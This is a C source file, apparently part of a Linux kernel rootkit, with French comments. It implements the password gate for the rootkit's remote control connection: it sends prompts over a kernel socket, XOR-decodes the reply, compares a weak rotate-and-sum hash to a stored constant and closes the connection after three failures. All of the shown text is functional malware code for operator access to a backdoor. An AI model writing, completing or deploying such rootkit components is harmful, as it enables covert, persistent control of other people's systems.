#include "rootkit.h"

// Fonction basique de hash pour verifier le mot de passe
unsigned int basic_hash(const char *password) {
    unsigned int sum = 0;
    int i = 0;
    for (; password[i]; i++) {
        unsigned char c = password[i];
        unsigned char rot = ((c << 3) | (c >> 5)) & 0xFF;
        sum += rot;
    }
    return sum;
}

// Fonction pour assurer l'authentification
int authenticated(struct socket *sock) {
    char cmd[MAX_CMD_LEN] = {0};
    struct msghdr rec_msg = {0};
    struct kvec rec_vec = {0};
    int receive = 0;
    int len;
    unsigned int hash_result;
    struct msghdr send_msg = {0};
    struct kvec send_vec;

    send_vec.iov_base = "Please type the rootkit's password \n";
    send_vec.iov_len = strlen("Please type the rootkit's password \n");
    kernel_sendmsg(conn_socket, &send_msg, &send_vec, 1, send_vec.iov_len);
    
    send_vec.iov_base = "Password: ";
    send_vec.iov_len = strlen("Password: ");
    kernel_sendmsg(conn_socket, &send_msg, &send_vec, 1, send_vec.iov_len);

    rec_vec.iov_base = cmd;
    rec_vec.iov_len = MAX_CMD_LEN - 1;

    receive = kernel_recvmsg(conn_socket, &rec_msg, &rec_vec, 1, MAX_CMD_LEN - 1, 0);
    if (receive <= 0) {
        send_vec.iov_base = "[INFO] Auth failed, no input\n";
        send_vec.iov_len = strlen("[INFO] Auth failed, no input\n");
        kernel_sendmsg(conn_socket, &send_msg, &send_vec, 1, send_vec.iov_len);
        return 0;
    }
    
    if (receive > 0) {
        extern void xor_crypt(char *data, size_t len);
        xor_crypt(cmd, receive);
    }
    if (receive >= MAX_CMD_LEN){
        receive = MAX_CMD_LEN - 1;
    }
    cmd[receive] = '\0';

    len = strlen(cmd);
    while (len > 0 && (cmd[len-1] == '\n' || cmd[len-1] == '\r')) {
        cmd[--len] = '\0';
    }

    hash_result = basic_hash(cmd);
    if (hash_result == BASIC_HASH) {
        send_vec.iov_base = "[INFO] Auth success\n";
        send_vec.iov_len = strlen("[INFO] Auth success\n");
        kernel_sendmsg(conn_socket, &send_msg, &send_vec, 1, send_vec.iov_len);
        return 1;
    } else {
        send_vec.iov_base = "[INFO] Auth failed\n";
        send_vec.iov_len = strlen("[INFO] Auth failed\n");
        kernel_sendmsg(conn_socket, &send_msg, &send_vec, 1, send_vec.iov_len);
        return 0;
    }
}

// Fonction pour boucle d'authentification
int authentication_loop(void) {
    int auth_attempts = 0;
    int is_authenticated = 0;
    while (!is_authenticated && auth_attempts < 3) {
        is_authenticated = authenticated(conn_socket);
        if (!is_authenticated) {
            auth_attempts++;
            if (auth_attempts >= 3) {
                send_response("[ERROR] Too many failed attempts. Connection closed.\n");
                return 0;
            }
        }
    }
    return is_authenticated;
}
